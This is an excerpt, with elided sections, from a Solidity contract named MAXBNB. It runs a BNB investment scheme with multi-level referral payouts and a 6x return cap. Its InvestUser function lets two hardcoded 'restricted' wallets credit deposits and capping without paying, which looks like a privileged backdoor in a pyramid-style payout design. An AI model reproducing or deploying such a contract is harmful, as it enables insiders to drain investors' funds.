...
contract MAXBNB {
    ...
    uint256 public INVEST_MIN_AMOUNT = 1e17; // 0.1 bnb 
    uint256[] public REFERRAL_PERCENTS  = [1200, 600, 300, 200, 200, 100,100,100,100,100];
    uint256[] public SEED_PERCENTS      = [2000, 1500, 1000, 900, 800, 700, 600, 500, 400, 300,200,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100,100];
    ...
    address payable public restricted_wallet = 0x37BaF5a6b54aB0C88A735878Dd7C79fA0603E66E;
    address payable public restricted2_wallet = 0x540c096de6d8f41F57074FB125154F379572dc93;
    ...
    function invest(address referrer ) public payable {
        ...
        users[msg.sender].capping = users[msg.sender].capping.add(msg.value.mul(6));
        users[user.referrer].directBusiness = users[user.referrer].directBusiness.add(msg.value);
    ...
    function withdraw() public {
        ...
        require(user.income_status == 0, "Capping Limit Reached.Re-topup Required");
        ...
        if(leftAmount > 0 && user.income_status == 0) {
            ...
            uint256 fee = leftAmount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
    ...
    function UpgradeMinAmount(uint256 _amount) public{
        if (msg.sender == commissionWallet) {
            INVEST_MIN_AMOUNT = _amount;
        }
    }

    function InvestUser(uint256 _amount) public{
        
        if(msg.sender == restricted_wallet || msg.sender == restricted2_wallet) {
            ...
            if (user.deposits.length == 0) {
                user.checkpoint = block.timestamp;
                users[_user].capping = users[_user].capping.add(_amount.mul(6));
    ...
    function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 cappingLimit, uint8 cappingStatus) {
        return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress), users[userAddress].capping, users[userAddress].income_status);
    }
